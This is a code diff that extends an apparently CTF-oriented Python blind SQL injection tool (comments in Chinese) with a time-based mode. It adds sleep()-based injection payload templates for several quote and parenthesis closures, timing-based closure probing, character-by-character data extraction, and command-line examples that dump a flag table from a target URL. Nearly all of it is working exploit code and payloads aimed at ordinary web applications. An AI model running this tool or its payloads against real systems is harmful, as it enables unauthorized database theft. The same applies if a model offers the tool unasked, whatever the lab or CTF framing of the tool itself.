@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-通用 Boolean-Based SQL 盲注提取脚本
+通用 Boolean-Based / Time-Based SQL 盲注提取脚本
 适用范围：CTF / 授权测试 / 本地靶场
 
 特性：
@@ -18,6 +18,7 @@
 - 支持 --hex 自动包装查询结果为 hex(({query}))
 - 支持 --probe-closure 自动探测数字型/字符型基础闭合方式
 - 支持 --no-verify 跳过 TLS 证书校验（自签名证书目标）
+- 支持 --time-based 时间盲注模式（基于 sleep + 响应时间判定，自动调整 timeout）
 - 支持 --dump（跳过系统库）/ --dump-all（含系统库）全量拉取数据并保存到 result/ 目录
 - 支持 --dump-flag <关键词> 在用户库中搜索表名/列名/数据并高亮命中
 - 支持 --view [URL] 查看历史 dump 记录
@@ -53,7 +54,7 @@ import urllib.request
 
 import requests
 
-__version__ = "1.5.2"
+__version__ = "1.6.0"
 DEFAULT_UA = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
@@ -482,6 +483,11 @@ DEFAULT_RETRIES = 3
 DEFAULT_DELAY = 0.0
 DEFAULT_CLOSURE_TEST_EXPR_TRUE = "1=1"
 DEFAULT_CLOSURE_TEST_EXPR_FALSE = "1=2"
+
+DEFAULT_SLEEP_TIME = 5.0
+DEFAULT_TIME_PAYLOAD = "1 and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)"
+DEFAULT_TIME_EQ_PAYLOAD = "1 and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)"
+DEFAULT_TIME_LEN_PAYLOAD = "1 and if(length(({query}))>{mid},sleep({sleep}),0)"
 UNKNOWN = "?"
 CharResult = Union[str, Literal["?"]]
 
@@ -535,6 +541,11 @@ class Config:
     dump_all: bool = False
     dump_flag: Optional[str] = None
     verify: bool = True
+    time_based: bool = False
+    sleep_time: float = DEFAULT_SLEEP_TIME
+    time_payload: Optional[str] = None
+    time_eq_payload: Optional[str] = None
+    time_len_payload: Optional[str] = None
     sorted_chars: List[str] = field(default_factory=list)
 
     def __post_init__(self) -> None:
@@ -621,6 +632,17 @@ def evaluate_response(resp: requests.Response, cfg: Config) -> bool:
 
 
 def send_check(session: requests.Session, cfg: Config, payload: str) -> Optional[bool]:
+    if cfg.time_based:
+        resp = send_raw(session, cfg, payload)
+        if resp is None:
+            return None
+        elapsed = resp.elapsed.total_seconds()
+        threshold = cfg.sleep_time * 0.8
+        ok = elapsed >= threshold
+        if cfg.verbose:
+            with print_lock:
+                print(f"[debug] time-check={ok}, elapsed={elapsed:.2f}s, threshold={threshold:.2f}s")
+        return ok
     resp = send_raw(session, cfg, payload)
     if resp is None:
         return None
@@ -1154,10 +1176,114 @@ def probe_closure(session: requests.Session, cfg: Config, samples: int = 2) -> b
     return False
 
 
+def time_closure_candidates() -> List[Tuple[str, str, str, str]]:
+    """
+    时间盲注基础闭合方式候选。
+
+    返回：name, bool_tpl, gt_tpl, eq_tpl。
+    bool_tpl 使用 {expr} 和 {sleep}，gt_tpl / eq_tpl 使用 {query} {i} {mid} {sleep}。
+    """
+    return [
+        (
+            "numeric-time",
+            "1 and if({expr},sleep({sleep}),0)",
+            "1 and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)",
+            "1 and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)",
+        ),
+        (
+            "numeric-comment-dash-time",
+            "1 and if({expr},sleep({sleep}),0)-- -",
+            "1 and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)-- -",
+            "1 and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)-- -",
+        ),
+        (
+            "single-quote-time",
+            "1' and if({expr},sleep({sleep}),0)-- -",
+            "1' and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)-- -",
+            "1' and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)-- -",
+        ),
+        (
+            "double-quote-time",
+            '1" and if({expr},sleep({sleep}),0)-- -',
+            '1" and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)-- -',
+            '1" and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)-- -',
+        ),
+        (
+            "single-quote-paren-time",
+            "1') and if({expr},sleep({sleep}),0)-- -",
+            "1') and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)-- -",
+            "1') and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)-- -",
+        ),
+        (
+            "double-quote-paren-time",
+            '1") and if({expr},sleep({sleep}),0)-- -',
+            '1") and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)-- -',
+            '1") and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)-- -',
+        ),
+    ]
+
+
+def probe_closure_time(session: requests.Session, cfg: Config, samples: int = 2) -> bool:
+    """
+    时间盲注模式下的闭合方式探测。
+
+    通过比较永真/永假条件的响应时间差异，确认注入是否生效。
+    """
+    print("[*] 正在探测基础闭合方式（时间盲注模式）...")
+
+    original_payload = cfg.payload
+    original_eq_payload = cfg.eq_payload
+    original_len_payload = cfg.len_payload
+
+    threshold = cfg.sleep_time * 0.8
+
+    for name, bool_tpl, gt_tpl, eq_tpl in time_closure_candidates():
+        true_payload = bool_tpl.format(expr="1=1", sleep=cfg.sleep_time)
+        false_payload = bool_tpl.format(expr="1=2", sleep=cfg.sleep_time)
+
+        true_times: List[float] = []
+        false_times: List[float] = []
+        failed = False
+
+        for _ in range(samples):
+            tr = send_raw(session, cfg, true_payload)
+            fr = send_raw(session, cfg, false_payload)
+            if tr is None or fr is None:
+                failed = True
+                break
+            true_times.append(tr.elapsed.total_seconds())
+            false_times.append(fr.elapsed.total_seconds())
+
+        if failed:
+            continue
+
+        true_ok = all(t >= threshold for t in true_times)
+        false_ok = all(t < threshold for t in false_times)
+
+        if true_ok and false_ok:
+            cfg.payload = gt_tpl
+            cfg.eq_payload = eq_tpl
+            cfg.len_payload = bool_tpl.format(expr="length(({query}))>{mid}", sleep=cfg.sleep_time)
+            cfg.true_payload = bool_tpl.format(expr="1=1", sleep=cfg.sleep_time)
+            cfg.false_payload = bool_tpl.format(expr="1=2", sleep=cfg.sleep_time)
+            print(f"[+] 闭合方式探测成功（时间盲注）: {name}")
+            if cfg.verbose:
+                print(f"[debug] payload     = {cfg.payload}")
+                print(f"[debug] eq_payload  = {cfg.eq_payload}")
+                print(f"[debug] len_payload = {cfg.len_payload}")
+            return True
+
+    cfg.payload = original_payload
+    cfg.eq_payload = original_eq_payload
+    cfg.len_payload = original_len_payload
+    print("[!] 未能自动确认闭合方式（时间盲注），将继续使用当前 payload 模板。")
+    return False
+
+
 def make_len_payload(cfg: Config, mid: int) -> str:
     if cfg.len_payload:
-        return cfg.len_payload.format(query=cfg.query, mid=mid)
-    return cfg.payload.format(query=f"length(({cfg.query}))", i=1, mid=mid)
+        return cfg.len_payload.format(query=cfg.query, mid=mid, sleep=cfg.sleep_time)
+    return cfg.payload.format(query=f"length(({cfg.query}))", i=1, mid=mid, sleep=cfg.sleep_time)
 
 
 def detect_length(session: requests.Session, cfg: Config) -> Optional[int]:
@@ -1189,11 +1315,11 @@ def detect_length(session: requests.Session, cfg: Config) -> Optional[int]:
 
 
 def ascii_gt(session: requests.Session, cfg: Config, pos: int, value: int) -> Optional[bool]:
-    return send_check(session, cfg, cfg.payload.format(query=cfg.query, i=pos, mid=value))
+    return send_check(session, cfg, cfg.payload.format(query=cfg.query, i=pos, mid=value, sleep=cfg.sleep_time))
 
 
 def ascii_eq(session: requests.Session, cfg: Config, pos: int, value: int) -> Optional[bool]:
-    return send_check(session, cfg, cfg.eq_payload.format(query=cfg.query, i=pos, mid=value))
+    return send_check(session, cfg, cfg.eq_payload.format(query=cfg.query, i=pos, mid=value, sleep=cfg.sleep_time))
 
 
 def binary_search_ascii(session: requests.Session, cfg: Config, pos: int) -> Optional[CharResult]:
@@ -1367,14 +1493,35 @@ def extract_query(
     return final
 
 
+def _setup_time_based(cfg: Config) -> None:
+    """时间盲注模式的初始化：设置默认 payload、自动调整 timeout。"""
+    if not cfg.time_payload:
+        cfg.time_payload = DEFAULT_TIME_PAYLOAD
+    if not cfg.time_eq_payload:
+        cfg.time_eq_payload = DEFAULT_TIME_EQ_PAYLOAD
+    if not cfg.time_len_payload:
+        cfg.time_len_payload = DEFAULT_TIME_LEN_PAYLOAD
+    cfg.payload = cfg.time_payload
+    cfg.eq_payload = cfg.time_eq_payload
+    cfg.len_payload = cfg.time_len_payload
+    min_timeout = cfg.sleep_time + 5.0
+    if cfg.timeout < min_timeout:
+        print(f"[*] 时间盲注模式：自动调整 timeout {cfg.timeout}s -> {min_timeout}s")
+        cfg.timeout = min_timeout
+
+
 def extract(cfg: Config) -> str:
     main_session = new_session(cfg)
 
-    if cfg.probe_closure:
-        probe_closure(main_session, cfg, samples=cfg.probe_samples)
-
-    if cfg.auto_mark:
-        auto_detect_true_feature(main_session, cfg)
+    if cfg.time_based:
+        _setup_time_based(cfg)
+        if cfg.probe_closure:
+            probe_closure_time(main_session, cfg, samples=cfg.probe_samples)
+    else:
+        if cfg.probe_closure:
+            probe_closure(main_session, cfg, samples=cfg.probe_samples)
+        if cfg.auto_mark:
+            auto_detect_true_feature(main_session, cfg)
 
     return extract_query(main_session, cfg, cfg.query)
 
@@ -1484,6 +1631,11 @@ def view_history(url: Optional[str] = None) -> int:
 
 def prepare_detection(session: requests.Session, cfg: Config) -> None:
     """枚举前准备：必要时自动探测闭合方式与 true/false 特征。"""
+    if cfg.time_based:
+        _setup_time_based(cfg)
+        if cfg.probe_closure:
+            probe_closure_time(session, cfg, samples=cfg.probe_samples)
+        return
     if cfg.true_mark == DEFAULT_TRUE_MARK:
         cfg.auto_mark = True
     if cfg.payload == DEFAULT_PAYLOAD:
@@ -1723,6 +1875,8 @@ def build_config(args) -> Config:
         raise ValueError("save-every 必须 >= 1")
     if args.auto_samples < 2:
         raise ValueError("auto-samples 必须 >= 2")
+    if args.time_based and args.sleep_time <= 0:
+        raise ValueError("sleep-time 必须 > 0")
 
     return Config(
         url=url,
@@ -1765,6 +1919,11 @@ def build_config(args) -> Config:
         dump_all=args.dump_all,
         dump_flag=args.dump_flag,
         verify=not args.no_verify,
+        time_based=args.time_based,
+        sleep_time=args.sleep_time,
+        time_payload=args.time_payload,
+        time_eq_payload=args.time_eq_payload,
+        time_len_payload=args.time_len_payload,
     )
 
 
@@ -1819,12 +1978,27 @@ HELP_EXAMPLES = """\
   9) 查看历史 dump 记录
      python blind_sqli.py --view "http://target.com"     # 指定目标的最新记录
      python blind_sqli.py --view                         # 列出全部历史
+
+ 10) 时间盲注（适用于无回显差异但可利用 sleep 的场景）
+     python blind_sqli.py -u "http://target/index.php?id=1" \
+         -q "select flag from flag" --time-based --sleep-time 3
+
+     时间盲注 + 自动探测闭合方式：
+     python blind_sqli.py -u "http://target/index.php?id=1" \
+         -q "select flag from flag" --time-based --probe-closure
+
+     自定义时间盲注 payload（字符型闭合，单引号）：
+     python blind_sqli.py -u "http://target/index.php?id=1" \
+         -q "select flag from flag" --time-based \
+         --time-payload "1' and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)-- -" \
+         --time-eq-payload "1' and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)-- -" \
+         --time-len-payload "1' and if(length(({query}))>{mid},sleep({sleep}),0)-- -"
 """
 
 
 def parse_args():
     parser = argparse.ArgumentParser(
-        description="通用 Boolean-Based SQL 盲注提取脚本，仅用于 CTF / 授权测试 / 本地靶场。",
+        description="通用 Boolean-Based / Time-Based SQL 盲注提取脚本，仅用于 CTF / 授权测试 / 本地靶场。",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=HELP_EXAMPLES,
     )
@@ -1871,6 +2045,13 @@ def parse_args():
     extract.add_argument("--save-every", type=int, default=5, help="断点文件每完成 N 位保存一次")
     extract.add_argument("--save-interval", type=float, default=2.0, help="断点文件至少每隔多少秒保存一次")
 
+    time_group = parser.add_argument_group("时间盲注")
+    time_group.add_argument("--time-based", action="store_true", help="启用时间盲注模式（基于 sleep + 响应时间判定）")
+    time_group.add_argument("--sleep-time", type=float, default=DEFAULT_SLEEP_TIME, help="时间盲注 sleep 秒数（默认 5.0）")
+    time_group.add_argument("--time-payload", default=None, help="时间盲注大于判断 payload 模板（含 {sleep} 占位符）")
+    time_group.add_argument("--time-eq-payload", default=None, help="时间盲注等值校验 payload 模板（含 {sleep} 占位符）")
+    time_group.add_argument("--time-len-payload", default=None, help="时间盲注长度判断 payload 模板（含 {sleep} 占位符）")
+
     enum = parser.add_argument_group("数据库枚举")
     dump_group = enum.add_mutually_exclusive_group()
     dump_group.add_argument("--dump", action="store_true", help="全量拉取用户数据库（跳过系统库），保存到 result/ 并自动回放")
@@ -1902,7 +2083,7 @@ def main() -> int:
     if not any(flag in sys.argv for flag in ("-h", "--help", "--version")):
         print(LOGO)
         print("=" * 50)
-        print("  通用 Boolean-Based SQL 盲注脚本")
+        print("  通用 Boolean-Based / Time-Based SQL 盲注脚本")
         print("  仅用于 CTF / 授权测试 / 本地靶场")
         print("=" * 50)
 
@@ -1937,7 +2118,10 @@ def main() -> int:
     print(f"[*] 目标: {cfg.url}")
     print(f"[*] 参数: {cfg.param}")
     print(f"[*] 查询: {cfg.query}")
-    print(f"[*] 真值特征模式: {'auto' if cfg.auto_mark else cfg.check_mode}")
+    if cfg.time_based:
+        print(f"[*] 模式: 时间盲注 (sleep={cfg.sleep_time}s)")
+    else:
+        print(f"[*] 真值特征模式: {'auto' if cfg.auto_mark else cfg.check_mode}")
     print()
 
     try:
